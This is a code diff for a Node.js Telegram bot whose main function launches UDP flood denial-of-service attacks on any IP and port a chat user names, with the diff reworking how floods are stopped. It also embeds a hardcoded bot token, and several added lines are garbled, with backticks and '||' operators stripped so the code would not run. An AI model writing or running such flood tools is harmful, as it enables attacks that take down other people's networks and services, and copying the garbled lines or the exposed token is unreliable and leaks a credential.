@@ -5,18 +5,22 @@ const dgram = require('dgram');
 const token = '6725616382:AAFThqEKrBdWBNvomNBucwvoH2GmSC2Zx90';
 const bot = new TelegramBot(token, { polling: true });
 
+let floodInstances = {};
+
 // Function to perform UDP flood
 const udpFlood = (chatId, host, port) => {
   const client = dgram.createSocket('udp4');
   const message = Buffer.alloc(65000, 'X');
   let packets = 0;
+  let floodActive = true;
 
   // Function to send packets
   const sendPacket = () => {
+    if (!floodActive) return;
     packets++;
     client.send(message, 0, message.length, port, host, (err) => {
       if (err) {
-        console.error(`Error: ${err.message}`);
+        console.error(Error: ${err.message});
       }
       sendPacket();
     });
@@ -27,17 +31,19 @@ const udpFlood = (chatId, host, port) => {
 
   // Update user every second with the current packet count
   const updateInterval = setInterval(() => {
-    bot.sendMessage(chatId, `Packets sent: ${packets}`);
+    if (!floodActive) {
+      clearInterval(updateInterval);
+    } else {
+      bot.sendMessage(chatId, Packets sent: ${packets});
+    }
   }, 1000);
 
-  // Handle bot stop command to end the flood
-  bot.onText(/\/stop/, (msg) => {
-    if (msg.chat.id === chatId) {
-      clearInterval(updateInterval);
-      client.close();
-      bot.sendMessage(chatId, `UDP Flood stopped. Total packets sent: ${packets}`);
-    }
-  });
+  // Save instance information for stopping
+  floodInstances[chatId] = () => {
+    floodActive = false;
+    client.close();
+    bot.sendMessage(chatId, UDP Flood stopped. Total packets sent: ${packets});
+  };
 };
 
 // Handler for the /start command
@@ -51,11 +57,22 @@ bot.onText(/\/udp (.+) (.+)/, (msg, match) => {
   const host = match[1];
   const port = parseInt(match[2], 10);
 
-  if (!host || isNaN(port) || port <= 0 || port > 65535) {
+  if (!host  isNaN(port)  port <= 0 || port > 65535) {
     bot.sendMessage(chatId, 'Invalid parameters. Usage: /udp <IP> <port>');
     return;
   }
 
-  bot.sendMessage(chatId, `Starting UDP flood on ${host} on port ${port}. Use /stop to end the flood.`);
+  bot.sendMessage(chatId, Starting UDP flood on ${host} on port ${port}. Use /stop to end the flood.);
   udpFlood(chatId, host, port);
+});
+
+// Handler for the /stop command
+bot.onText(/\/stop/, (msg) => {
+  const chatId = msg.chat.id;
+  if (floodInstances[chatId]) {
+    floodInstances[chatId]();
+    delete floodInstances[chatId];
+  } else {
+    bot.sendMessage(chatId, 'No active UDP flood to stop.');
+  }
 });
